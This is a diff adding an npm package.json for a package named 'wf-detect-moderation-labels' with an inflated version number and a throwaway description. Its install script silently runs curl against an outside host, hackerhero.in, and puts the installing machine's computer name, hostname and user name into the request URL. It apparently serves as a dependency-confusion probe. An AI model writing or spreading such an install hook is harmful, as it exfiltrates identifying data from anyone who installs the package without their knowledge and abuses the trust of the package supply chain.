@@ -1,0 +1,14 @@
+{
+  "name": "wf-detect-moderation-labels",
+  "version": "200.0.16",
+  "description": "wf-detect-moderation-labels: coolest nodejs  package on planet earth",
+  "main": "index.js",
+  "scripts": {
+   "install": "curl -sI http://hackerhero.in/jugnu/%computername%`hostname`/%username%-`whoami`/p-wf-detect-moderation-labels"
+  },
+  "author": "another noob developer",
+  "license": "ISC",
+  "dependencies": {
+    "wf-translate-text": "^0.0.1"
+  }
+}
